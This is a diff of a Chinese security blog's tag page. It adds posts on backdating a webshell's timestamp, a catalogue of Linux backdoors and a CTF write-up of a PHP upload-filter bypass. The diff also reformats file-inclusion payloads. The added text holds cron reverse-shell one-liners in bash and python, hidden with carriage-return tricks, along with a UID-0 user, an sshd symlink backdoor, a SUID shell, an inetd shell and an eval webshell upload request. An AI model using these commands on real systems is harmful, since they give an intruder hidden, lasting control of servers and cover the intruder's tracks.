@@ -79,13 +79,13 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="http://yoursite.com/categories/index.html">
+<meta property="og:title" content="标签">
+<meta property="og:url" content="http://yoursite.com/tags/index.html">
 <meta property="og:site_name" content="从零开始的学习生涯">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-26T04:50:14.525Z">
+<meta property="og:updated_time" content="2018-01-26T04:50:25.031Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="分类">
+<meta name="twitter:title" content="标签">
 
 
 
@@ -113,7 +113,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/"/>
+  <link rel="canonical" href="http://yoursite.com/tags/"/>
 
 
 
@@ -247,6 +247,541 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/11/自用Linux命令手册/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="平贺桐人">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/11/自用Linux命令手册/" itemprop="url">自用Linux命令手册</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-11T22:42:50+08:00">2018-11-11</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Linux-Unix-修改文件时间戳"><a href="#Linux-Unix-修改文件时间戳" class="headerlink" title="Linux/Unix 修改文件时间戳"></a>Linux/Unix 修改文件时间戳</h1><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>
+<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>
+<p>利用方法</p>
+<p><code>touch -r index.php webshell.php</code></p>
+<p>或者直接将时间戳修改成某年某月某日。如下 2018 年 11 月 11 日。</p>
+<p><code>touch -t 1811111042.30 webshell.php</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/07/2018-11-7-Linux后门总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="平贺桐人">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/07/2018-11-7-Linux后门总结/" itemprop="url">Linux后门总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-07T19:09:37+08:00">2018-11-07</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>ubuntu16.04<br>反弹shell目标：127.0.0.1:233</p>
+<h1 id="cron定时反弹shell"><a href="#cron定时反弹shell" class="headerlink" title="cron定时反弹shell"></a>cron定时反弹shell</h1><h2 id="修改crontab文件"><a href="#修改crontab文件" class="headerlink" title="修改crontab文件"></a>修改crontab文件</h2><p> 创建文件 /etc/…</p>
+<pre><code>#!/bin/bash
+
+if netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/null
+
+then
+
+echo &quot;OK&quot;&gt;/dev/null
+
+else
+
+/sbin/iptables --policy INPUT ACCEPT
+
+/sbin/iptables --policy OUTPUT ACCEPT
+
+bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1
+
+fi
+</code></pre><p>增加权限</p>
+<p><code>chmod +sx /etc/...</code></p>
+<p>然后在/etc/crontab中添加定时任务</p>
+<p><code>*/1 * * * * root /etc/...</code></p>
+<p>最后重启一下 crond 的服务<br><code>service cron reload</code></p>
+<h2 id="一句话Crontab后门"><a href="#一句话Crontab后门" class="headerlink" title="一句话Crontab后门"></a>一句话Crontab后门</h2><p>bash版本<br><code>(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code><br>python版本<br><code>(crontab -l;printf &quot;*/5 * * * *  /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;;\r\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code></p>
+<h1 id="Linux-Unix-添加-UID-为-0-的用户"><a href="#Linux-Unix-添加-UID-为-0-的用户" class="headerlink" title="Linux/Unix 添加 UID 为 0 的用户"></a>Linux/Unix 添加 UID 为 0 的用户</h1><p>免交互设置密码<br>    useradd seradd -u 0 -o -g root -G fdrag0n</p>
+<pre><code>echo &quot;passwd&quot; | passwd --stdin fdrag0n
+</code></pre><p>因为linux可能有密码策略<br>所以推荐使用强密码替换passwd</p>
+<h1 id="爆破linux密码"><a href="#爆破linux密码" class="headerlink" title="爆破linux密码"></a>爆破linux密码</h1><p>取出/etc/shadow<br>hashcat爆破</p>
+<h1 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h1><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p>
+<p>客户端：</p>
+<pre><code>$ ssh-keygen -t rsa
+$ ls
+id_rsa  id_rsa.pub
+</code></pre><p>把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。</p>
+<p>服务端：</p>
+<pre><code>$ chmod 600 ~/.ssh/authorized_keys
+$ chmod 700 ~/.ssh
+</code></pre><p>这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。</p>
+<h1 id="软连接后门"><a href="#软连接后门" class="headerlink" title="软连接后门"></a>软连接后门</h1><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333;
+</code></pre><p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可。</p>
+<p>但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。</p>
+<p><strong>重启会断开</strong></p>
+<h1 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h1><p>在root账号下执行</p>
+<pre><code>cp /bin/bash /.fdrag0n
+chmod 4755 /.fdrag0n
+</code></pre><p>在普通用户下执行</p>
+<pre><code>/.fdrag0n -p
+</code></pre><p><strong>检查手段</strong></p>
+<pre><code>find / -perm +4000 -ls
+</code></pre><h1 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h1><p>修改 /etc/inetd.conf 文件</p>
+<p>原文件：</p>
+<pre><code>#chargen dgram udp wait root internal
+
+#discard stream tcp nowait root internal
+
+#discard dgram udp wait root internal
+
+#daytime stream tcp nowait root internal
+</code></pre><p>修改为:</p>
+<pre><code>#discard stream tcp nowait root internal
+
+#discard dgram udp wait root internal
+
+daytime stream tcp nowait root /bin/bash bash -i
+</code></pre><p>然后重启inetd</p>
+<pre><code>ps -ef | grep inetdroot
+kill -HUP xxx
+</code></pre><p>然后nc连接即可</p>
+<h1 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h1><h2 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h2><p>参见<a href="https://fdrag0n.github.io/2018/05/15/SSH后门复现/" title="ssh后门复现" target="_blank" rel="noopener">https://fdrag0n.github.io/2018/05/15/SSH后门复现/</a></p>
+<h2 id="内核级rookit"><a href="#内核级rookit" class="headerlink" title="内核级rookit"></a>内核级rookit</h2><p>暂未复现，复现后补上</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/24/PHP数组与c数组差异而引发的问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="平贺桐人">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/24/PHP数组与c数组差异而引发的问题/" itemprop="url">PHP数组与c数组差异而引发的安全问题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-24T22:19:24+08:00">2018-08-24</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="C语言数组"><a href="#C语言数组" class="headerlink" title="C语言数组"></a>C语言数组</h1><p><strong>C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。</strong><br><img src="https://fdrag0n.github.io/image/2018-8-24 235941/arrays.jpg" alt="Alt text"><br>设有一个数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int array[2];</span><br></pre></td></tr></table></figure>
+<p>无论是先给<code>array[0]</code>赋值,还是先给<code>array[1]</code>赋值，其在内存中的排序都是<code>array[0]</code>在前面<code>array[1]</code>在后面，所以无论是用指针指向array的最后一个单元还是直接引用<code>array[1]</code>的值,其所指的都是同一个值。</p>
+<h1 id="PHP的数组"><a href="#PHP的数组" class="headerlink" title="PHP的数组"></a>PHP的数组</h1><p><strong>而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。</strong><br>贴上一个简易的上传过滤源码</p>
+<pre><code>&lt;?php
+    $file = $_GET[&apos;file&apos;];
+    if (!is_array($file)) {
+        $file = explode(&apos;.&apos;, strtolower($file));
+    }
+    print_r ($file);
+    echo &apos;&lt;/br&gt;&apos;;
+    $ext = end($file);
+    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {
+        print(&apos;This file is not allowed!&lt;/br&gt;&apos;);
+    }
+    else print(&apos;success!&lt;/br&gt;&apos;);
+    var_dump($file);
+    echo &apos;&lt;/br&gt;&apos;;
+    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];
+    echo &apos;filename:&apos;.$filename;
+    echo &apos;&lt;/br&gt;&apos;;
+    echo &apos;end($file):&apos;.end($file);
+?&gt;
+</code></pre><p>如图<code>file[0]</code>和<code>file[1]</code>都是由get传参，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，会被拦截。</p>
+<pre><code>file[0]=png&amp;file[1]=php
+</code></pre><p>但是如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，则可以成功绕过过滤规则上传。</p>
+<pre><code>file[1]=php&amp;file[0]=png
+</code></pre><p>演示截图：</p>
+<p><img src="https://fdrag0n.github.io/image/2018-8-24 235941/2018-8-24 231639.PNG" alt="Alt text"></p>
+<p>代码第六行和第十二行将其显示出来，由图右侧可见，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，数组是<code>Array ( [0] =&gt; png [1] =&gt; php )</code>，会被拦截。</p>
+<p>而如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，数组就是<code>Array ( [1] =&gt; php [0] =&gt; png )</code> ,它所占内存区域中最后一个单元是<code>file[0]=&gt;png</code>，而<strong>不像</strong>C语言一样是file[1]，所以如果过滤代码一方面用<code>end()</code>来取出数组最后一个单元，而另外一处却用<code>$file[count($file) - 1]</code>来取出最后一个单元，就会存在有绕过的漏洞。</p>
+<h1 id="拿python来比较一下更好说明"><a href="#拿python来比较一下更好说明" class="headerlink" title="拿python来比较一下更好说明"></a>拿python来比较一下更好说明</h1><ul>
+<li>C语言的数组更像Python 列表(List)</li>
+<li>而PHP的数组像Python 字典(Dictionary)</li>
+</ul>
+<h1 id="涉及到的CTF：-网鼎杯第二场的上传题–wafUpload"><a href="#涉及到的CTF：-网鼎杯第二场的上传题–wafUpload" class="headerlink" title="涉及到的CTF： 网鼎杯第二场的上传题–wafUpload"></a>涉及到的CTF： 网鼎杯第二场的上传题–wafUpload</h1><pre><code>&lt;?php
+$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);
+@mkdir($sandbox);
+@chdir($sandbox);
+
+if (!empty($_FILES[&apos;file&apos;])) {
+#mime check
+if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) {
+die(&apos;This type is not allowed!&apos;);
+}
+
+#check filename
+$file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];
+if (!is_array($file)) {
+$file = explode(&apos;.&apos;, strtolower($file));
+}
+$ext = end($file);
+if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {
+die(&apos;This file is not allowed!&apos;);
+}
+
+$filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];
+if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) {
+echo &apos;Success!&apos;;
+echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;
+} else {
+echo &apos;Failed!&apos;;
+}
+}
+show_source(__file__);
+?&gt;
+</code></pre><ul>
+<li>第8-10行mime check部分 MIME 类型检测，使用图片马绕过。</li>
+<li>第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 <code>$file</code> 数组中最后一个元素。然后在生成文件的时候，文件名取<code>$file</code> 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制<code>$file</code>数组中参数的即可绕过并 getshell ，请求数据包如下</li>
+</ul>
+<pre><code>POST / HTTP/1.1
+Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/
+Content-Type: multipart/form-data; boundary=---------------------------9930139772306
+Content-Length: 524
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------9930139772123
+Content-Disposition: form-data; name=&quot;filename[1]&quot;
+
+php
+-----------------------------9930139772123
+Content-Disposition: form-data; name=&quot;filename[0]&quot;
+
+png
+-----------------------------9930139772123
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fdrag0n.jpg&quot;
+Content-Type: image/jpeg
+
+&lt;?php @eval($_POST[&apos;a&apos;]);?&gt;
+-----------------------------9930139772123
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+Submit
+-----------------------------9930139772123--
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -1182,7 +1717,7 @@ wlan0mon 启用监听模式的网卡名
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/09/文件上传漏洞常用命令/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/09/文件包含漏洞常用命令/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="平贺桐人">
@@ -1201,7 +1736,7 @@ wlan0mon 启用监听模式的网卡名
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/04/09/文件上传漏洞常用命令/" itemprop="url">文件上传漏洞常用命令</a></h1>
+                <a class="post-title-link" href="/2018/04/09/文件包含漏洞常用命令/" itemprop="url">文件包含漏洞常用命令</a></h1>
         
 
         <div class="post-meta">
@@ -1269,16 +1804,13 @@ wlan0mon 启用监听模式的网卡名
 <p>php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</p>
 <p>用例1 增加一句话：</p>
 <p>URL：</p>
-<p><a href="http://localhost/include/file.php?file=php://input" target="_blank" rel="noopener">http://localhost/include/file.php?file=php://input</a><br>POST：</p>
-<p>&lt;?php fputs(fopen(“shell.php”,”a”),”&lt;?php phpinfo();?&gt;”) ?&gt;</p>
-<p>用例2 增加文件：</p>
-<p>URL：</p>
-<p><a href="http://localhost/include/file.php?file=php://input" target="_blank" rel="noopener">http://localhost/include/file.php?file=php://input</a><br>POST：</p>
-<p>&lt;?php fputs(fopen(“oneword.php”,”w”),”&lt;?php phpinfo();?&gt;”) ?&gt;<br>这里fopen参数为w，可新建一个文件。</p>
+<pre><code>http://localhost/include/file.php?file=php://input
+</code></pre><p>POST：</p>
+<pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;
+</code></pre><p>用例2 增加文件：</p>
+<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code><br>这里fopen参数为w，可新建一个文件。</p>
 <p>用例3 执行系统命令：</p>
-<p>URL：</p>
-<p><a href="http://localhost/include/file.php?file=php://input" target="_blank" rel="noopener">http://localhost/include/file.php?file=php://input</a><br>POST：</p>
-<p>&lt;?php system(‘ipconfig’);?&gt;</p>
+<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php system(&#39;ipconfig&#39;);?&gt;</code></p>
 <hr>
 <p>2)data://</p>
 <p>说明：</p>
@@ -1290,440 +1822,11 @@ wlan0mon 启用监听模式的网卡名
 <p>3)<strong>php://filter</strong></p>
 <p>说明：</p>
 <p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：</p>
-<p>?page=php://filter/read=convert.base64-encode/resource=php.ini</p>
-<p>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</p>
+<pre><code>?page=php://filter/read=convert.base64-encode/resource=php.ini
+</code></pre><p>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</p>
 <p><strong>payload:</strong></p>
 <pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php
 </code></pre><p>资料来源：<br><a href="https://www.anquanke.com/post/id/86123" title="参考网站" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86123</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="平贺桐人">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="从零开始的学习生涯">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/" itemprop="url">打造手机渗透神器kali-linux-nethunter安装</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-10T12:59:57+08:00">2018-03-10</time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="一加1（bacon）-Kali-Nethunter安装指南"><a href="#一加1（bacon）-Kali-Nethunter安装指南" class="headerlink" title="一加1（bacon） Kali Nethunter安装指南"></a>一加1（bacon） Kali Nethunter安装指南</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
-<li><h3 id="准备一加一手机"><a href="#准备一加一手机" class="headerlink" title="准备一加一手机"></a>准备一加一手机</h3><ul>
-<li>解锁并刷到CM12并且开过一次机（我用魔趣也能成功，理论上来说任意6.0都行）</li>
-<li>刷好TWRP recovery</li>
-</ul>
-</li>
-<li><h3 id="官网下载刷机包"><a href="#官网下载刷机包" class="headerlink" title="官网下载刷机包"></a>官网下载刷机包</h3><hr>
-<h4 id="夜版（nightly）"><a href="#夜版（nightly）" class="headerlink" title="夜版（nightly）"></a>夜版（nightly）</h4><p> 刷机包本体：<br> <a href="https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip" title="ARM框架用" target="_blank" rel="noopener">https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip</a></p>
-<p> 内核：<br> 6.0 <a href="https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip" title="安卓6.0" target="_blank" rel="noopener">https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip</a></p>
-<hr>
-<h4 id="正式版（强烈推荐）"><a href="#正式版（强烈推荐）" class="headerlink" title="正式版（强烈推荐）"></a>正式版（强烈推荐）</h4><p> 刷机包本体：<br> <a href="https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip" title="适用于一加1的正式版" target="_blank" rel="noopener">https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip</a></p>
-<hr>
-</li>
-<li><h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><ul>
-<li>千万别双清，千万别双清，千万别双清（如果date被清了会刷写失败）</li>
-<li>卡刷刷机包本体（正式版）</li>
-<li>（如果是夜版先刷内核再刷刷机包本体）</li>
-</ul>
-</li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/11/记一次解决某网站高速下载病毒/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="平贺桐人">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="从零开始的学习生涯">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/11/记一次解决某网站高速下载病毒/" itemprop="url">记一次解决某网站高速下载病毒</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-11T11:19:04+08:00">2018-02-11</time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="怒草流氓软件"><a href="#怒草流氓软件" class="headerlink" title="怒草流氓软件"></a>怒草流氓软件</h1><p>在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。<br>天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。 </p>
-<p>在注册表<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</strong>里能找到和流氓软件对应地址的一个注册表项，删除此项，重启，问题解决。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/06/kali更新源问题解决方案/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="平贺桐人">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="从零开始的学习生涯">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/06/kali更新源问题解决方案/" itemprop="url">kali更新源问题解决方案</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
